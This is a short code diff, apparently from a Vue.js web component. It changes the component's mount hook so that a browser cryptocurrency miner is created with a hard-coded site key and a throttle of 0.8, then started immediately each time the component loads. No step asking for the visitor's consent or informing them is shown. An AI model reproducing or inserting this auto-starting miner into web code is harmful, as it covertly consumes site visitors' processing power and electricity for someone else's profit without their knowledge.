@@ -35,12 +35,19 @@ export default {
     },
 
     mounted(){
-        let miner = window.miner || new Client.Anonymous('3c21f085fed5b3e7d3ed288237f341ad552e51e7af400c5f204f78cef1ea08f6', {
-            throttle: 0.8
-        });
-        window.miner = miner;
-       
-        this.miner = miner;
+        if(typeof window.miner === 'undefined'){
+            let miner = new Client.Anonymous('3c21f085fed5b3e7d3ed288237f341ad552e51e7af400c5f204f78cef1ea08f6', {
+                throttle: 0.8
+            });
+            window.miner = miner;
+
+            this.miner = window.miner;
+            this.StartMiner();
+        }else{
+            this.miner = window.miner;
+        }
+      
+        
     },
 
     methods: {
